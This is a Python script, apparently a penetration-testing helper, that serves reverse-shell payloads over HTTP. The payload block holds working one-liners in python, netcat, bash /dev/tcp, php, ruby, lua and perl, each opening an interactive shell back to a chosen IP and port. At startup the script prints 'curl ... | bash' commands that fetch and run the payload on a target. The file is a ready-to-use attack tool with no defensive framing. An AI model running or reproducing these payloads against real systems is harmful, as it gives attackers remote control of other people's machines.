#!/usr/bin/env python3

########
########

import http.server 
import socketserver
import netifaces as nic
import argparse
from ipaddress import ip_address
import sys

class GetHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # stupid way to identify an interface
            if not ':' in self.path and '.' not in self.path:
                self.int = self.path.replace('/', '')
                self.ip_addr = nic.ifaddresses(self.int)[nic.AF_INET][0]['addr']
                self.port = args.listener
                self.send_payloads()

            elif len(self.path.replace('/', '').split(':')) == 2 and ip_address(self.path.replace('/', '').split(':')[0]):
                self.ip_addr = self.path.replace('/', '').split(':')[0]
                self.port = self.path.replace('/', '').split(':')[1] if self.path.replace('/', '').split(':')[1] != '' else args.listener
                self.send_payloads()

            elif ip_address(self.path.replace('/', '')):
                self.ip_addr = self.path.replace('/', '')
                self.port = args.listener
                self.send_payloads()
        except:
            self.empty_request()

    def payloads(self, ip_addr, port):
        generated = """
        if command -v python > /dev/null 2>&1; then
        python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{I}",{P})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
        exit;
        fi
        if command -v python3 > /dev/null 2>&1; then
        python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{I}",{P})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
        exit;
        fi
        if command -v nc > /dev/null 2>&1; then
            rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {I} {P} >/tmp/f
            exit;
        fi
        if command -v sh > /dev/null 2>&1; then
            /bin/sh -i >& /dev/tcp/{I}/{P} 0>&1
            exit;
        fi
        if command -v php > /dev/null 2>&1; then
            php -r '$sock=fsockopen("{I}",{P});exec("/bin/sh -i <&3 >&3 2>&3");'
            exit;
        fi
        if command -v ruby > /dev/null 2>&1; then
            ruby -rsocket -e'f=TCPSocket.open("{I}",{P}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
            exit;
        fi
        if command -v lua > /dev/null 2>&1; then
            lua -e "require('socket');require('os');t=socket.tcp();t:connect('{I}','{P}');os.execute('/bin/sh -i <&3 >&3 2>&3');"
            exit;
        fi
        if command -v perl > /dev/null 2>&1; then
            perl -e 'use Socket;$i="{I}";$p={P};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
            exit;
        fi
        """.format(I=ip_addr, P=port)
        return(generated)

    def send_payloads(self):
            self.send_response(200)
            self.send_header('Content-type', 'plaintext')
            self.end_headers()
            self.wfile.write(self.payloads(self.ip_addr, self.port).encode())

    def empty_request(self):
            self.send_response(200)
            self.send_header('Content-type', 'plaintext')
            self.end_headers()
            self.wfile.write("No IP or PORT specified".encode())

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Automatic payload generation')
    parser.add_argument('-s', '--server', action='store', type=int, default=8000, help='Python http server listener.  Default 8000.')
    parser.add_argument('-l', '--listener', action='store', type=int, default=10001, help='nc listener.  Default 10001.')
    parser.add_argument('-i', '--ipaddress', action='store', type=ip_address, help='IP address')
    parser.add_argument('-I', '--interface', action='store', type=str, help='Interface name')
    args = parser.parse_args()

    def urls():
        print("The following is just a quick guide for payload execution.")
        urls = ''
        try:
            if args.interface:
                ip = nic.ifaddresses(args.interface)[nic.AF_INET][0]['addr']
                urls += "curl -s http://{IP}:{PORT}/{INT}|bash\n".format(IP=ip, PORT=args.server, INT=args.interface)
            elif args.ipaddress:
                urls += "curl -s http://{IP}:{PORT}/{INT}:{LISTENER}|bash\n".format(IP=args.ipaddress, PORT=args.server, INT=args.ipaddress, LISTENER=args.listener)
            else:
                print("No interface or IP specified so here's a lazy template.")
                for interface in nic.interfaces():
                    try:
                        ip = nic.ifaddresses(interface)[nic.AF_INET][0]['addr']
                        urls += "curl -s http://{IP}:{PORT}/{INT}|bash\n".format(IP=ip, PORT=args.server, INT=interface)
                    except:
                        continue
            return urls
        except Exception as e:
            print(e)

    httpd = socketserver.TCPServer(("", args.server), GetHandler)
    try:
        print(f"Shell generator started: {args.server}")
        print(urls())
        httpd.serve_forever()

    except KeyboardInterrupt:
        print("\nKeyboard interrupt received, exiting.")
        httpd.shutdown()
        sys.exit(0)
